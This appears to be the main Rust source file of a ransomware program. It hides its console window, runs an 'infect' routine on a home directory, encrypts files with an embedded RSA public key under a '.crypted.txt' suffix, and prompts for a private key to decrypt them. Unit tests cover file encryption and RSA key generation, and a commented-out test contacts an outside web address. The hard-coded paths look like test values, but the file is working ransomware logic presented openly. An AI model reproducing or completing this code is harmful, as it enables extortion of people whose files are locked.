#![windows_subsystem = "windows"]

mod cry;
mod life;

// PRV: siqnpbka4xa3i48be0fftz8wf09f45lbnk73d66jq00erzlyxr1ejg37csy9i8m4abuph8lom84e29oh4hwerma1dx99rf2n8zjombn1arhytj6a8ezmkf0kcouv2jwtdlxznsf2tkx14nghfpxrjpg9m26yqzoe2m0xnnnw95gvvimi50yps24d4x447vtpc8soch-wm7v3mt8c2tn50rdcjf2sihp4nevzaspq7bxono5kwq10ar801i68gnwfgj8d5ltp3wpkyexkts7omr2jkqluqtqfi3ang34rx1-wimoh6zbkd4uwnafyi9w4jspi1r4p770qamrafyfnwjqsnu1mhvta6ian9d11tapndglnqgbh59vjzcaz1nm0biww5hxrg2w035
// FAKE PRIMES: 4321324-1234231-213443
const PUB_KEY: &str = "tgmnbz5rgre4uqbepqyh86tdccxzh1pedg5v95h33r7i9jsfhiedwf41m7qpqhrxdl58q2gbct0labbp31fllizvqxc5t0ga0wma3v8t4assy9xqqy0facic61fdr48vfhukilpqteciz33jikivczhafns2owxhyqhhxfm26ok2mnskkc5jnzviuh7ytmktl8vmo5-1ekh";
const UNLOCKED_FILE: &str = "unlocked";
const LOG_FILE: &str = "log";
const ENCR_FOLDER: &str = "files";
const ENCR_SUFFIX: &str = ".crypted.txt";

fn main() {

  let rsa_pub = cry::decode_pub(PUB_KEY).expect("cannot decode pubkey");
  let home = "/home/jake/.xxx/";

  if !std::fs::metadata(format!("{}/{}", home, UNLOCKED_FILE)).is_err() {
    return
  }

  let log = life::infect(home);
  life::enc_drive(&rsa_pub, home, &log, "/tmp/test/");

  let rsa_prv = life::prompt_key(PUB_KEY);
  let log = std::fs::File::open(format!("{}/{}", home, LOG_FILE));
  if log.is_err() {
    use dialog::DialogBox;
    dialog::Message::new("Log file missing.")
        .title("Error!")
        .show()
        .unwrap_or(());
  } else {
    life::decrypt(rsa_prv, home, &log.expect("log cannot be opened"));
    std::fs::write(format!("{}/{}", home, UNLOCKED_FILE), "").unwrap();
  }
  println!("exiting");
}




#[test]
fn test_encr() {
  let key = cry::rnd_key_iv();
  std::fs::write("/tmp/prova.txt", "ciao").unwrap();
  life::enc_file("/tmp/prova.txt", "/tmp/prova.enc.txt", &key);
  life::dec_file("/tmp/prova.enc.txt", "/tmp/prova.dec.txt", &key);
}

// #[test]
// fn test_https() {
//   use http_req::request;
//   let mut writer = Vec::new(); // container for body of a response
//   let res = request::get(format!("https://gufoe.it/post/{}", me), &mut writer).expect("Cannot connect");
//   println!("Status: {} {}", res.status_code(), res.reason());
// }

#[test]
fn test_rsa_gen() {
  use rsa::{RSAPrivateKey};
  use rand::rngs::OsRng;
  let mut rng = OsRng::new().expect("no secure randomness available");
  let bits = 1024;
  let key = RSAPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
  println!("PRIVATE KEY:\n{}", (cry::encode_prv(&key)));
  assert!(key == cry::decode_prv(&cry::encode_prv(&key)).expect("cannot decode prv"));
  println!("PUBLIC KEY:\n{}", (cry::encode_pub(&key.to_public_key())));
  assert!(key.to_public_key() == cry::decode_pub(&cry::encode_pub(&key.to_public_key())).expect("cannot decode pub"));
}

#[test]
fn test_ui() {
  // life::prompt_key(PUB_KEY);
}
